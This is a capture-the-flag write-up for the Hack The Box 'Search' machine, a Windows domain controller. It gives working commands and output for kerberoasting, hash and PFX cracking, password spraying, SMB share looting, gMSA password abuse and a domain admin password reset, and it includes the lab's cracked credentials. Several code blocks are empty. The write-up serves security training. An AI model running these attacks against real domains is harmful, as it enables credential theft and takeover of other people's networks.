The [Search](https://app.hackthebox.com/machines/search) machine has been created by [MrR3boot](https://app.hackthebox.com/users/13531). This is a **hard** Windows Machine with a strong focus on Active Directory enumeration and exploitation.  

If you didn't solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.

**Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).

# Reconnaissance

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Scan with Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/). Note the **-sV** switch which enables *version detection* and allows Nmap to check its internal database to try to determine the service protocol, application name and version number.

**Note:** Always allow a few minutes after the start of the HTB box to make sure that all the services are properly running. If you scan the machine right away, you may miss some ports that should be open.

```

**Remember:** By default, **Nmap** will scans the 1000 most common TCP ports on the targeted host(s). Make sure to read the [documentation](https://nmap.org/docs.html) if you need to scan more ports or change default behaviors.
{: .notice--warning}

This machine is a domain controller for **search.htb**. We also have a couple of web-related port **HTTP** (80/TCP) and **HTTPS** (443/TCP).

## HTTP Recon

Let's check this website, but before, we will add the domain to our `/etc/hosts` file with the following command:
- `echo "10.129.227.156 search.htb" | sudo tee --append /etc/hosts`

First, let's do a quick enumeration using [gobuster](https://github.com/OJ/gobuster) and see if we can find interesting files or directories.

```bash

Interesting, we have **/certenroll** and **/certsrv** web pages which indicate that the Certification Authority (CA) Web Enrollment interface is enabled. 

Also, it seems that we have a **/staff** web page, which is inaccessible at the moment.

By looking closely at the pictures present on the website, we found a potential password for Hope Sharp (`IsolationIsKey?`)

![image-center](/images/htb/htb_search_pass.png){: .align-center}

```bash
$ crackmapexec smb search.htb -u hope.sharp -p IsolationIsKey?
SMB         10.129.227.156  445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.156  445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey?
```

The credentials are valid, however, this account does not have remote access privileges on the box. Maybe we could try a **kerberoasting** attack to find another account.

# Initial Access

In a real-world scenario, adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives. With the previously discovered account, let's see if we can execute a kerberoast attack.

## Kerberoasting

[Kerberoasting](https://attack.mitre.org/techniques/T1558/003/) is an interesting technique that only requires a valid account on the targeted domain. Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any **SPN** from a domain controller. 

Portions of these tickets may be encrypted with the **RC4** algorithm, meaning the *Kerberos 5 TGS-REP etype 23* hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials.

Here, we can use [impacket-GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) to find Service Principal Names (SPN) that are associated with a user account and request a TGS.

```bash
$ impacket-GetUserSPNs search.htb/hope.sharp -dc-ip 10.129.227.156 -request

```

As we can see, the **web_svc** account is kerberoastable. Let's try to crack its password.

## Password Cracking

We just have to crack the recovered hash offline using the *rockyou* password list (if you are using Kali Linux, it should be present in the `/usr/share/wordlists/` folder). Here, we used [John the Ripper](https://github.com/openwall/john) to crack the password, but it can be done with other tools.

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt kerb_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Press 'q' or Ctrl-C to abort, almost any other key for status
@3ONEmillionbaby (?)     
1g 0:00:00:20 DONE (2023-04-28 09:56) 0.04780g/s 549203p/s 549203c/s 549203C/s @421eduymayte619..@33croc
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Nice, we have a cracked the account's password. (`web_svc:@3ONEmillionbaby`). Let's see if this account is valid.

```bash
$ crackmapexec smb search.htb -u web_svc -p @3ONEmillionbaby
SMB         search.htb      445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         search.htb      445    RESEARCH         [+] search.htb\web_svc:@3ONEmillionbaby
```

Again, this account does not have any remote access on the targeted box. Let's keep looking around.

## LDAP

Here, we did an anonymous bind on the LDAP port using [ldapsearch](https://linux.die.net/man/1/ldapsearch) to look for some information. With the `grep` command, we can look for the **userPrincipalName** attribute that specifies the UPN of the users.

```bash
$ ldapsearch -x -b "dc=search,dc=htb" "*" -H ldap://search.htb -D web_svc@search.htb -w '@3ONEmillionbaby' | grep userPrincipalName
userPrincipalName: Santino.Benjamin@search.htb
userPrincipalName: Payton.Harmon@search.htb
userPrincipalName: Trace.Ryan@search.htb
userPrincipalName: Reginald.Morton@search.htb
userPrincipalName: Eddie.Stevens@search.htb
userPrincipalName: Cortez.Hickman@search.htb
userPrincipalName: Chace.Oneill@search.htb
userPrincipalName: Abril.Suarez@search.htb
userPrincipalName: Savanah.Velazquez@search.htb
userPrincipalName: Antony.Russo@search.htb
userPrincipalName: Cameron.Melendez@search.htb
userPrincipalName: Edith.Walls@search.htb
userPrincipalName: Lane.Wu@search.htb
userPrincipalName: Arielle.Schultz@search.htb

...[snip]...
```

More usernames, we will try a password spraying later but first, let's see if **web_svc** has access to shared folders.

## Shared Folders

While **web_svc** does not have any remote access to the computer, using `crackmapexec` and the `--shares` switch, it was possible to list some shares accessible by this user.

```bash
$ crackmapexec smb search.htb -u web_svc -p @3ONEmillionbaby --shares
SMB         search.htb      445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)

```

We have **READ** and **WRITE** access on *RedirectedFolders$*, let's see if there is anything interesting in it.

```bash
$ smbclient \\\\10.129.227.156\\RedirectedFolders$ -U web_svc@search.htb

Lots of folders, here we will download everything we can to save some time. Note that we used the `recurse` command to enable directory recursion for the command `mget` and `prompt off` to make sure that all specified files (if any) will be transferred without asking if we want to download them.

```bash
smb: \> prompt off
smb: \> recurse
smb: \> mget *
NT_STATUS_ACCESS_DENIED opening remote file \sierra.frye\user.txt
NT_STATUS_ACCESS_DENIED listing \abril.suarez\Desktop\*

...[snip]...
```

We can see the first flag in **sierra.frye** folder, but we can't read it. Let's try a password spraying attack with the usernames and passwords we found.

## Password Spraying

As stated by [MITRE](https://attack.mitre.org/techniques/T1110/003/), adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password, or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.

Here we built a list of usernames and used it in a password spraying attack with [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) to see if it yields any results.

```bash
$ crackmapexec smb search.htb -u users.txt -p pass.txt --continue-on-success
SMB         search.htb      445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)

...[snip]...

SMB         search.htb      445    RESEARCH         [-] search.htb\Marshall.Skinner:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         search.htb      445    RESEARCH         [-] search.htb\Edgar.Jacobs:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         search.htb      445    RESEARCH         [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby 

...[snip]...
```

Ok, we have another valid account (`Edgar.Jacobs:@3ONEmillionbaby`). 

Now, we can recheck the shared folder and see if this account has access to interesting files. Again, we will use `smbclient` and look into the **edgar.jacobs** folder.

```bash
$ smbclient \\\\10.129.227.156\\RedirectedFolders$ -U Edgar.Jacobs@search.htb

Interesting, we have a file named **Phishing_Attempt.xlsx**. If we open the file we have a bunch of usernames, but the column containing the passwords is protected.

![image-center](/images/htb/htb_search_xlsx_locked.png){: .align-center}

Using the technique explained in this [post](https://www.excelsupersite.com/how-to-remove-an-excel-spreadsheet-password-in-6-easy-steps/) it was possible to bypass the password verification by modifying the file.

Once the file is repacked, the protected column should be visible.

![image-center](/images/htb/htb_search_xlsx_unlocked.png){: .align-center}

Lots of potentially valid passwords! But we will start with **sierra.frye** (`$$49=wide=STRAIGHT=jordan=28$$18`) as this user can read the **first flag**.

```bash

Awesome, **sierra.frye** also has some certificates in the **Backups** folder.

```bash
smb: \sierra.frye\> cd Downloads\
smb: \sierra.frye\Downloads\> ls
  .                                 DRc        0  Fri Jul 31 10:45:36 2020

```

As the name of one of the certificates is **staff.pfx**, it may be a hint. These certificates could be the key to access the **/staff** folder we previously found. 

However, after trying to import them in a web browser, we discovered that the certificates were password protected.

![image-center](/images/htb/htb_search_cert_pass.png){: .align-center}

No big deal, using `pfx2john` we can recover the hash of the PFX file and try to crack it with a dictionary attack.

```bash
$ pfx2john staff.pfx > hash.pfx
```

As usual, we used the *rockyou* wordlist to attempt to crack the password.

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.pfx

```

Ok, we have the password (`misspissy`). We can now import the certificates in our browser and try to access the **/staff** folder.

![image-center](/images/htb/htb_search_cert.png){: .align-center}

Here, the URL **https://search.htb/staff** will redirect us to a PowerShell Web Access login page. Using the `Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18` credentials we can try to connect to the remote machine.

![image-center](/images/htb/htb_search_webps.png){: .align-center}

Finally, we have a shell.

![image-center](/images/htb/htb_search_webps2.png){: .align-center}

## Active Directory Recon

With a valid account, we can now use one of the [BloodHound](https://github.com/BloodHoundAD/BloodHound) ingestors and gather more information about the Active Directory. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. 

Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Here, we used a Python based ingestor for BloodHound, [BloodHound.py](https://github.com/fox-it/BloodHound.py).

```bash
$ bloodhound-python -c DCOnly -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb -ns 10.129.227.156 --zip
INFO: Found AD domain: search.htb

INFO: Found 113 computers
INFO: Found 0 trusts
INFO: Done in 00M 29S
INFO: Compressing output into 20230428105127_bloodhound.zip
```

By looking at the BloodHound output, we can see that Sierra Frye is a member of the **BIRMINGHAM-ITSEC@SEACH.HTB** group and this specific group is part of the **ITSEC@SEARCH.HTB** group. 

The **ITSEC@SEARCH.HTB** have *ReadGMSAPassword* privileges on the **BIR-ADFS-GMSA@SEARCH.HTB**. We can abuse this weakness to read the gMSA (Group Managed Service Accounts) password of the account.

![image-center](/images/htb/htb_search_bh1.png){: .align-center}

Then, if we take a closer look at the **BIR-ADFS-GMSA@SEARCH.HTB** account, we can see that it has *GenericAll* privileges on the **TRISTAN.DAVIES@SEARCH.HTB** who is domain admin.

![image-center](/images/htb/htb_search_bh2.png){: .align-center}

Next step, privilege escalation.

# Privilege Escalation

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## Abuse ReadGMSAPassword

Like we saw earlier, according to **BloodHound**, **Sierra.Frye** is part of the **ITSEC** group and has *ReadGMSAPassword* permission on the **BIR-ADFS-GMSA@SEARCH.HTB** domain account.

Group Managed Service Accounts (GMSA) are a special type of Active Directory object, where the password for that object is managed by and automatically changed by Domain Controllers on a set interval. The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.

Once we recovered the password of the **BIR-ADFS-GMSA@SEARCH.HTB** account, we were able to change the password of **TRISTAN.DAVIES@SEARCH.HTB**.

![image-center](/images/htb/htb_search_gmsa.png){: .align-center}

Then, we can test if the password change we performed on **tristan.davies** worked.

```bash
$ crackmapexec smb search.htb -u tristan.davies -p 'P@ssw0rd!'
SMB         search.htb      445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         search.htb      445    RESEARCH         [+] search.htb\tristan.davies:P@ssw0rd! (Pwn3d!)
```

Finally, we just had to recover the **second flag** and finish the challenge.

```bash
$ crackmapexec smb search.htb -u tristan.davies -p 'P@ssw0rd!' -x "dir c:\Users\Administrator\Desktop" 
SMB         search.htb      445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
